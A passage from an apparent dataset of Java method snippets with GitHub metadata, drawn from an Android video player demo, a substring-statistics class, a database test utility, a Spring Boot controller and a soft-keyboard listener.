if (isPlay) {            getCurPlay().release();        }        //GSYPreViewManager.instance().releaseMediaPlayer();        if (orientationUtils != null)            orientationUtils.releaseListener();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/AudioDetailPlayer.java", "stars": "2", "class": {"name": "AudioDetailPlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onConfigurationChanged", "params": ["Configuration"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onConfigurationChanged(Configuration newConfig) {        super.onConfigurationChanged(newConfig);        //\u5982\u679c\u65cb\u8f6c\u4e86\u5c31\u5168\u5c4f        if (isPlay && !isPause) {            detailPlayer.onConfigurationChanged(this, newConfig, orientationUtils, true, true);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/AudioDetailPlayer.java", "stars": "2", "class": {"name": "AudioDetailPlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "resolveNormalVideoUI", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveNormalVideoUI() {        //\u589e\u52a0title        detailPlayer.getTitleTextView().setVisibility(View.GONE);        detailPlayer.getBackButton().setVisibility(View.GONE);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/AudioDetailPlayer.java", "stars": "2", "class": {"name": "AudioDetailPlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurPlay", "params": [], "throws": null, "modifiers": ["private"], "return_type": "GSYVideoPlayer", "snippet": "    private GSYVideoPlayer getCurPlay() {        if (detailPlayer.getFullWindowPlayer() != null) {            return detailPlayer.getFullWindowPlayer();        }        return detailPlayer;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/AudioDetailPlayer.java", "stars": "2", "class": {"name": "AudioDetailPlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getUrl", "params": [], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getUrl() {        String url = \"android.resource://\" + getPackageName() + \"/\" + R.raw.test3;        //\u6ce8\u610f\uff0c\u7528ijk\u6a21\u5f0f\u64ad\u653eraw\u89c6\u9891\uff0c\u8fd9\u4e2a\u5fc5\u987b\u6253\u5f00        GSYVideoManager.instance().enableRawPlay(getApplicationContext());        ///exo raw \u652f\u6301        //String url =  RawResourceDataSource.buildRawResourceUri(R.raw.test).toString();        return url;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/AudioDetailPlayer.java", "stars": "2", "class": {"name": "AudioDetailPlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "clone", "params": ["Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void clone(Substring other) {\t\tsuper.clone(other);\t\tBernoulliSubstring bs = (BernoulliSubstring)other;\t\tbs.barP=barP;\t\tbs.barPSquare=barPSquare;\t\tbs.logBarP=logBarP;\t\tbs.f=f;\t\tbs.g=g;\t\tif (nLeft>0) {\t\t\tSystem.arraycopy(leftF,0,bs.leftF,0,nLeft);\t\t\tSystem.arraycopy(leftG,0,bs.leftG,0,nLeft);\t\t}\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "deallocate", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void deallocate() {\t\tsuper.deallocate();\t\tleftF=null;\t\tleftG=null;\t\tif (tmpString1!=null) {\t\t\ttmpString1.deallocate();\t\t\ttmpString1=null;\t\t}\t\tif (tmpString2!=null) {\t\t\ttmpString2.deallocate();\t\t\ttmpString2=null;\t\t}\t\tout=null;\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "getInstance", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Substring", "snippet": "\tprotected Substring getInstance() {\t\treturn new BernoulliSubstring(alphabetLength,log2alphabetLength,bitsToEncodeAlphabetLength,bwtLength,log2BWTLength,bitsToEncodeBWTLength);\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "getEpsilon", "params": ["long"], "throws": null, "modifiers": ["protected"], "return_type": "Substring", "snippet": "\tprotected Substring getEpsilon(long[] C) {\t\tBorderSubstring out = (BorderSubstring)getInstance();\t\t// $bwtIntervals$\t\tout.nIntervals=alphabetLength+1;\t\tout.bwtIntervals[0][0]=0;  // $#$\t\tout.bwtIntervals[0][1]=0;\t\tfor (int i=0; i<alphabetLength-1; i++) {  // Other characters\t\t\tout.bwtIntervals[i+1][0]=C[i];\t\t\tout.bwtIntervals[i+1][1]=C[i+1]-1;\t\t}\t\tout.bwtIntervals[alphabetLength][0]=C[alphabetLength-1];\t\tout.bwtIntervals[alphabetLength][1]=bwtLength-1;\t\t// Other variables\t\tout.address=-1;\t\tout.log2address=-1;\t\tout.previousAddress=-1;\t\tout.length=0;\t\tout.log2length=-1;\t\tout.bitsToEncodeLength=1;\t\tout.firstCharacter=-1;\t\tout.hasBeenExtended=false;\t\tout.hasBeenStolen=false;\t\tout.computeRightContext();\t\tout.leftContext=-1;\t\tout.isLeftExtensionOfMaximalRepeat=false;\t\tout.nRight=0;\t\tout.nLeft=0;\t\tout.longestBorderLength=0;\t\tout.shortestPeriodLength=0;\t\tout.maxPossibleOccurrences=textLength+1;\t\tout.longestBorderRightCharacter=-1;\t\tout.longestBorderLeftCharacter=-1;\t\tbarP=1;\t\tbarPSquare=1;\t\tlogBarP=0;\t\tf=0;\t\tg=0;\t\treturn out;\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\t\tString out = super.toString()+\" | \";\t\tint i;\t\tout+=\"barP=\"+barP+\" f=\"+f+\" g=\"+g+\" \";\t\tout+=\"leftF: \";\t\tfor (i=0; i<nLeft; i++) out+=leftF[i]+\" \";\t\tout+=\"leftG: \";\t\tfor (i=0; i<nLeft; i++) out+=leftG[i]+\" \";\t\treturn out;\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "pushHeadPrime", "params": ["Stream", "Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void pushHeadPrime(Stream stack, Substring[] cache) {\t\tsuper.pushHeadPrime(stack,cache);\t\tstack.push(Double.doubleToLongBits(logBarP),64);if (Constants.TRACK_STACK) System.out.println(System.currentTimeMillis()+\"|+|s|\"+64);\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "readHeadPrime", "params": ["Stream", "Substring", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void readHeadPrime(Stream stack, Substring[] cache, boolean fast) {\t\tsuper.readHeadPrime(stack,cache,fast);\t\tlogBarP=Double.longBitsToDouble(stack.read(64));\t\tbarP=Math.exp(logBarP);\t\tbarPSquare=barP*barP;\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "popHeadPrime", "params": ["Stream", "Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void popHeadPrime(Stream stack, Substring[] cache) {\t\tstack.pop(64);if (Constants.TRACK_STACK) System.out.println(System.currentTimeMillis()+\"|-|s|\"+64);\t\tsuper.popHeadPrime(stack,cache);\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "pushAppendix", "params": ["Stream", "Substring"], "throws": null, "modifiers": ["final", "protected"], "return_type": "void", "snippet": "\tprotected final void pushAppendix(Stream stack, Substring[] cache) {\t\tsuper.pushAppendix(stack,cache);\t\tstack.push(leftContext,bitsToEncodeAlphabetLength);if (Constants.TRACK_STACK) System.out.println(System.currentTimeMillis()+\"|+|s|\"+(bitsToEncodeAlphabetLength));\t\tif (leftContext>1) {\t\t\t// To compute $f$ and $g$ for a maximal repeat, we need $f$ and $g$ for its\t\t\t// longest border, which is itself a maximal repeat. We can thus push on the\t\t\t// stack just the $f$ and $g$ of maximal repeats.\t\t\tstack.push(Double.doubleToLongBits(f),64);\t\t\tstack.push(Double.doubleToLongBits(g),64);if (Constants.TRACK_STACK) System.out.println(System.currentTimeMillis()+\"|+|s|\"+(64*2));\t\t}\t\tif (isLeftExtensionOfMaximalRepeat) {\t\t\t// To compute the arrays $leftF$ and $leftG$ of a left-extension $aw$ of a\t\t\t// maximal repeat $w$, we need the arrays $leftF$ and $leftG$ of its longest\t\t\t// border, which is itself the left-extension of a maximal repeat. Thus, we\t\t\t// only need to push on the stack the arrays $leftF$ and $leftG$ of\t\t\t// left-extensions of maximal repeats.\t\t\tstack.push(firstCharacter,log2alphabetLength);if (Constants.TRACK_STACK) System.out.println(System.currentTimeMillis()+\"|+|s|\"+log2alphabetLength);\t\t\tint i;\t\t\tfor (i=0; i<nLeft; i++) stack.push(Double.doubleToLongBits(leftF[i]),64);\t\t\tfor (i=0; i<nLeft; i++) stack.push(Double.doubleToLongBits(leftG[i]),64);if (Constants.TRACK_STACK) System.out.println(System.currentTimeMillis()+\"|+|s|\"+(nLeft*64*2));\t\t}\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "readAppendix", "params": ["Stream", "Substring", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void readAppendix(Stream stack, Substring[] cache, boolean fast) {\t\tsuper.readAppendix(stack,cache,fast);\t\tleftContext=(int)stack.read(bitsToEncodeAlphabetLength);\t\tf=0; g=0;\t\tif (leftContext>1) {\t\t\tif (fast) stack.setPosition(stack.getPosition()+64*2);\t\t\telse {\t\t\t\tf=Double.longBitsToDouble(stack.read(64));\t\t\t\tg=Double.longBitsToDouble(stack.read(64));\t\t\t}\t\t}\t\tfirstCharacter=-1;\t\tif (isLeftExtensionOfMaximalRepeat) {\t\t\tif (fast) stack.setPosition( stack.getPosition()+\t\t\t\t\t\t\t\t\t\t log2alphabetLength+\t\t\t\t\t\t\t\t\t\t 64*2*nLeft );\t\t\telse {\t\t\t\tfirstCharacter=(int)stack.read(log2alphabetLength);\t\t\t\tint i;\t\t\t\tfor (i=0; i<nLeft; i++) leftF[i]=Double.longBitsToDouble(stack.read(64));\t\t\t\tfor (i=0; i<nLeft; i++) leftG[i]=Double.longBitsToDouble(stack.read(64));\t\t\t}\t\t}\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "popAppendix", "params": ["Stream", "Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void popAppendix(Stream stack, Substring[] cache) {\t\tif (isLeftExtensionOfMaximalRepeat) {\t\t\tstack.pop(log2alphabetLength+64*2*nLeft);if (Constants.TRACK_STACK) System.out.println(System.currentTimeMillis()+\"|-|s|\"+( log2alphabetLength+64*2*nLeft ));\t\t}\t\tif (leftContext>1) {\t\t\tstack.pop(64*2);if (Constants.TRACK_STACK) System.out.println(System.currentTimeMillis()+\"|-|s|\"+( 64*2 ));\t\t}\t\tstack.pop(bitsToEncodeAlphabetLength);if (Constants.TRACK_STACK) System.out.println(System.currentTimeMillis()+\"|-|s|\"+( bitsToEncodeAlphabetLength ));\t\tsuper.popAppendix(stack,cache);\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "initAfterExtending", "params": ["Substring", "int", "RigidStream", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void initAfterExtending(Substring suffix, int firstCharacter, RigidStream characterStack, int[] buffer) {\t\tsuper.initAfterExtending(suffix,firstCharacter,characterStack,buffer);\t\t// $\\bar{p}$\t\tif (firstCharacter!=-1) {\t\t\tlogBarP=((BernoulliSubstring)suffix).logBarP+Constants.logProbabilities[firstCharacter];\t\t\tbarP=Math.exp(logBarP);\t\t\tbarPSquare=barP*barP;\t\t}\t\telse {\t\t\tlogBarP=0;\t\t\tbarP=1;\t\t\tbarPSquare=1;\t\t}\t\t\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "initAfterReading", "params": ["Stream", "RigidStream", "SimpleStream", "Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void initAfterReading(Stream stack, RigidStream characterStack, SimpleStream pointerStack, Substring[] cache) {\t\tsuper.initAfterReading(stack,characterStack,pointerStack,cache);\t\t// Computing $f(v)$ and $g(v)$ only for maximal repeats\t\tf=0; g=0;\t\tif (leftContext>1 && longestBorderLength>0) {\t\t\tlong backupPointer;\t\t\tdouble x;\t\t\tBernoulliSubstring lb = (BernoulliSubstring)longestBorder;\t\t\tbackupPointer=stack.getPosition();\t\t\tstack.setPosition(pointerStack.getElementAt(length-longestBorderLength-1));\t\t\tif (tmpString1==null) tmpString1=(BernoulliSubstring)getInstance();  // Executed at most once\t\t\ttmpString1.read(stack,cache,true,true,true);if (Constants.TRACK_HITS) System.out.println(tmpString1.length);\t\t\tstack.setPosition(backupPointer);\t\t\tx=Math.exp(tmpString1.logBarP);\t\t\tf = x*( bwtLength-(length<<1)+longestBorderLength +\t\t\t\t\tlb.f-((length-longestBorderLength)<<1)*lb.g );\t\t\tg = x*(1+lb.g);\t\t}\t\t// Computing $leftF$ and $leftG$ only for strings $v=aw$ where $a$ is a character\t\t// and $w$ is a maximal repeat.\t\tif (isLeftExtensionOfMaximalRepeat) {\t\t\tint b, k;\t\t\tlong backupPointer;\t\t\tdouble x, y, lbF, lbG;\t\t\tBernoulliSubstring B;\t\t\tfor (int i=0; i<nLeft; i++) {\t\t\t\tb=leftCharacters[i];\t\t\t\t// Loading $B$, the longest border of $v=aw$ that is followed by $b$ as a\t\t\t\t// prefix.\t\t\t\tbackupPointer=stack.getPosition();\t\t\t\tstack.setPosition(pointerStack.getElementAt(leftLengths[i]-1));\t\t\t\tif (tmpString1==null) tmpString1=(BernoulliSubstring)getInstance();  // Executed at most once\t\t\t\ttmpString1.read(stack,cache,true,true,true);if (Constants.TRACK_HITS) System.out.println(tmpString1.length);\t\t\t\tstack.setPosition(backupPointer);\t\t\t\tB=tmpString1;\t\t\t\t// Loading $x = \\prod_{z=|B|+1}^{|v|-1}\\mathbb{P}[v[z]] \\cdot \\mathbb{P}[b]$\t\t\t\tbackupPointer=stack.getPosition();\t\t\t\ty=0;\t\t\t\tif (length-leftLengths[i]-1>0) {\t\t\t\t\tstack.setPosition(pointerStack.getElementAt(length-leftLengths[i]-2));\t\t\t\t\tif (tmpString2==null) tmpString2=(BernoulliSubstring)getInstance();  // Executed at most once\t\t\t\t\ttmpString2.read(stack,cache,true,true,true);if (Constants.TRACK_HITS) System.out.println(tmpString2.length);\t\t\t\t\tstack.setPosition(backupPointer);\t\t\t\t\ty=tmpString2.logBarP;\t\t\t\t}\t\t\t\tx=Math.exp(y+Constants.logProbabilities[b]);\t\t\t\tk=Arrays.binarySearch(B.leftCharacters,0,B.nLeft,b);\t\t\t\tif (k>=0) {\t\t\t\t\tlbF=B.leftF[k];\t\t\t\t\tlbG=B.leftG[k];\t\t\t\t}\t\t\t\telse {\t\t\t\t\t// $B$ can be surely extended with $b$ to the right, but no border of\t\t\t\t\t// $B$ is followed by $b$.\t\t\t\t\tif (B.firstCharacter==b) {\t\t\t\t\t\tbackupPointer=stack.getPosition();\t\t\t\t\t\tstack.setPosition(pointerStack.getElementAt(B.length-2));\t\t\t\t\t\tif (tmpString2==null) tmpString2=(BernoulliSubstring)getInstance();  // Executed at most once\t\t\t\t\t\ttmpString2.read(stack,cache,true,true,true);if (Constants.TRACK_HITS) System.out.println(tmpString2.length);\t\t\t\t\t\tstack.setPosition(backupPointer);\t\t\t\t\t\tlbG=Math.exp(tmpString2.logBarP+Constants.logProbabilities[b]);\t\t\t\t\t\tlbF=(textLength-((B.length+1)<<1)+2)*lbG;\t\t\t\t\t}\t\t\t\t\telse {\t\t\t\t\t\tlbF=0;\t\t\t\t\t\tlbG=0;\t\t\t\t\t}\t\t\t\t}\t\t\t\tleftF[i] = x*( textLength-(length<<1)+leftLengths[i] +\t\t\t\t\t\t\t   lbF-((length-leftLengths[i])<<1)*lbG );\t\t\t\tleftG[i] = x*(1+lbG);\t\t\t}\t\t}\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "visited", "params": ["Stream", "RigidStream", "SimpleStream", "Substring", "Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void visited(Stream stack, RigidStream characterStack, SimpleStream pointerStack, Substring[] cache, Substring[] leftExtensions) {\t\tsuper.visited(stack,characterStack,pointerStack,cache,leftExtensions);\t\tif (leftContext>1) {\t\t\tgetExpectationAndVariance(length,barP,barPSquare,f,frequency(),longestBorderLength,out);\t\t\tgetScores(frequency(),out[0],out[1],barP,out);\t\t}\t\tif (isLeftExtensionOfMaximalRepeat) {\t\t\tboolean found;\t\t\tint i, j, b;\t\t\tlong freqPrime, lbPrime;\t\t\tdouble barPPrime, fPrime;\t\t\tj=0;\t\t\tfor (i=1; i<alphabetLength; i++) {  // Disregarding $#$\t\t\t\tfreqPrime=bwtIntervals[i][1]-bwtIntervals[i][0]+1;\t\t\t\tif (freqPrime<=0) continue;  // We do not consider absent words\t\t\t\tb=i-1;\t\t\t\tbarPPrime=Math.exp(logBarP+Constants.logProbabilities[b]);\t\t\t\twhile (j<nLeft && leftCharacters[j]<b) j++;\t\t\t\tfound=j<nLeft&&leftCharacters[j]==b;\t\t\t\tif (found) {\t\t\t\t\tfPrime=leftF[j];\t\t\t\t\tlbPrime=leftLengths[j]+1;\t\t\t\t}\t\t\t\telse {\t\t\t\t\t// $leftCharacters$ stores only the right-extensions $c$ of $v=aw$\t\t\t\t\t// such that $aw$ has a nonzero border followed by $c$. When $a$ is\t\t\t\t\t// not in $leftCharacters$, $awa$ has still a border of length one.\t\t\t\t\tif (firstCharacter==b) {\t\t\t\t\t\tlbPrime=1;\t\t\t\t\t\tfPrime=(textLength-((length+1)<<1)+2)*Math.exp(logBarP-Constants.logProbabilities[firstCharacter]+Constants.logProbabilities[b]);\t\t\t\t\t}\t\t\t\t\telse {\t\t\t\t\t\tfPrime=0;\t\t\t\t\t\tlbPrime=0;\t\t\t\t\t}\t\t\t\t}\t\t\t\tgetExpectationAndVariance(length+1,barPPrime,barPPrime*barPPrime,fPrime,freqPrime,lbPrime,outPrime);\t\t\t\tgetScores(freqPrime,out[0],out[1],barPPrime,outPrime);\t\t\t}\t\t}\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "getExpectationAndVariance", "params": ["long", "double", "double", "double", "long", "long", "double"], "throws": null, "modifiers": ["private", "final"], "return_type": "void", "snippet": "\tprivate final void getExpectationAndVariance(long length, double barP, double barPSquare, double f, long frequency, long longestBorderLength, double[] out) {\t\tdouble expectation, variance, b1, b2, pValue, pValueError;\t\t\t\texpectation=(bwtLength-length)*barP;\t\tvariance=expectation*(1-barP);  // First term of the variance\t\tvariance-=barPSquare*(((bwtLength-1)<<1)-3*length+2)*(length-1);  // Second term of the variance\t\tif (longestBorderLength>0) variance+=2*barP*f;\t\t// It's likely that the trick of \\cite{sinha2000statistical}, mentioned in\t\t// \\cite{apostolico2003monotony} on page 299, does not give any major speedup here.\t\tif (frequency<=Integer.MAX_VALUE && (length-longestBorderLength)/(double)length>Constants.GG*oneOverLogTextLength && textLength>Constants.GG*length) {\t\t\tb1 = barPSquare*( ((length*textLength)<<1) - textLength -3*length*length + (length<<2) - 1);\t\t\tb2 = variance-expectation+b1;\t\t\tpValueError=b1+b2;\t\t\tif (Constants.TIGHT_POISSON_ERROR) pValueError*=-StrictMath.expm1(0D-expectation)/expectation;  // $StrictMath.expm1$ is faster than $Math.expm1$ from experiments: see $FastMathTestPerformance.txt$.\t\t\tpValue=1D-(new PoissonDistribution(expectation)).cumulativeProbability((int)f);\t\t}\t\telse if (variance>0) {\t\t\tpValue=1D-(new NormalDistribution(expectation,Math.sqrt(variance))).cumulativeProbability(f);\t\t\tpValueError=-1;\t\t}\t\telse {\t\t\tpValue=-1; pValueError=-1;\t\t}\t\tout[0]=expectation; out[1]=variance; out[2]=pValue; out[3]=pValueError;\t\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "getScores", "params": ["double", "double", "double", "double", "double"], "throws": null, "modifiers": ["private", "static", "final"], "return_type": "void", "snippet": "\tprivate static final void getScores(double frequency, double expectation, double variance, double barP, double[] out) {\t\tout[0]=frequency-expectation;\t\tout[1]=frequency/expectation;\t\tout[2]=(frequency-expectation)/expectation;\t\tout[3]=(frequency-expectation)/Math.sqrt(expectation);\t\tout[4]=Math.abs(frequency-expectation)/Math.sqrt(expectation);  // Not always monotonic\t\tout[5]=(frequency-expectation)*(frequency-expectation)/expectation;  // Not always monotonic\t\tout[6]=(frequency-expectation)/Math.sqrt(expectation*(1-barP));  // Not always monotonic\t\tout[7]=expectation/Math.sqrt(variance);  // Not always monotonic\t\tout[8]=(frequency-expectation)/Math.sqrt(variance);  // Not always monotonic\t\tout[9]=Math.abs((frequency-expectation)/Math.sqrt(variance));  // Not always monotonic\t}", "url": "https://raw.githubusercontent.com/fcunial/portfolio/master/surprisingStrings/BernoulliSubstring.java", "stars": "2", "class": {"name": "BernoulliSubstring", "extends": "BorderSubstring", "implements": null, "modifiers": ["public"]}}, {"method_name": "initQuartzDB", "params": [], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "DatabaseOperator", "snippet": "  public static DatabaseOperator initQuartzDB() throws Exception {    final AzkabanDataSource dataSource = new EmbeddedMysqlDataSource();    final String sqlScriptsDir = new File(\"../azkaban-web-server/src/test/resources/\")        .getCanonicalPath();    final DatabaseSetup setup = new DatabaseSetup(dataSource, sqlScriptsDir);    setup.updateDatabase();    return new DatabaseOperator(new QueryRunner(dataSource));  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/test/java/azkaban/db/AzDBTestUtility.java", "stars": "18", "class": {"name": "AzDBTestUtility", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDBType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDBType() {      return \"h2-in-memory\";    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/test/java/azkaban/db/AzDBTestUtility.java", "stars": "18", "class": {"name": "EmbeddedH2BasicDataSource", "extends": "AzkabanDataSource", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "allowsOnDuplicateKey", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean allowsOnDuplicateKey() {      return false;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/test/java/azkaban/db/AzDBTestUtility.java", "stars": "18", "class": {"name": "EmbeddedH2BasicDataSource", "extends": "AzkabanDataSource", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getDBType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDBType() {      return \"h2-in-memory\";    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/test/java/azkaban/db/AzDBTestUtility.java", "stars": "18", "class": {"name": "EmbeddedMysqlDataSource", "extends": "AzkabanDataSource", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "allowsOnDuplicateKey", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean allowsOnDuplicateKey() {      return false;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/test/java/azkaban/db/AzDBTestUtility.java", "stars": "18", "class": {"name": "EmbeddedMysqlDataSource", "extends": "AzkabanDataSource", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "music", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Music", "snippet": "    public Music music() {        log.info(String.valueOf(music));        log.info(name);        return music;    }", "url": "https://raw.githubusercontent.com/mqxu/spring-boot-review/master/spring-boot-config/src/main/java/com/soft1851/springboot/config/controller/MusicController.java", "stars": "3", "class": {"name": "MusicController", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getBufferedTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getBufferedTime()    {        return bufferedTime;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/events/StreamProgressChangedEvent.java", "stars": "4", "class": {"name": "StreamProgressChangedEvent", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setOnSoftKeyBoardChangeListener", "params": ["OnSoftKeyBoardChangeListener"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setOnSoftKeyBoardChangeListener(OnSoftKeyBoardChangeListener onSoftKeyBoardChangeListener) {        this.onSoftKeyBoardChangeListener = onSoftKeyBoardChangeListener;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SoftKeyBoardListener.java", "stars": "2", "class": {"name": "SoftKeyBoardListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setListener", "params": ["Activity", "OnSoftKeyBoardChangeListener"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setListener(Activity activity, OnSoftKeyBoardChangeListener onSoftKeyBoardChangeListener) {        SoftKeyBoardListener softKeyBoardListener = new SoftKeyBoardListener(activity);        softKeyBoardListener.setOnSoftKeyBoardChangeListener(onSoftKeyBoardChangeListener);    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SoftKeyBoardListener.java", "stars": "2", "class": {"name": "SoftKeyBoardListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addLifeObServer", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addLifeObServer(Activity activity) {        if (activity instanceof LifecycleOwner) {            LifecycleOwner owner = (LifecycleOwner) activity;            owner.getLifecycle().addObserver((GenericLifecycleObserver) (source, event) -> {                if (event == Lifecycle.Event.ON_DESTROY) {                    if (rootView != null)                        rootView.getViewTreeObserver().removeOnGlobalLayoutListener(listener);                }            });        }    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SoftKeyBoardListener.java", "stars": "2", "class": {"name": "SoftKeyBoardListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "closeKeybord", "params": ["EditText", "Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void closeKeybord(EditText mEditText, Context mContext) {        InputMethodManager imm = (InputMethodManager) mContext.getSystemService(Context.INPUT_METHOD_SERVICE);        imm.hideSoftInputFromWindow(mEditText.getWindowToken(), 0);        mEditText.setFocusable(false);    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/SoftKeyBoardListener.java", "stars": "2", "class": {"name": "SoftKeyBoardListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    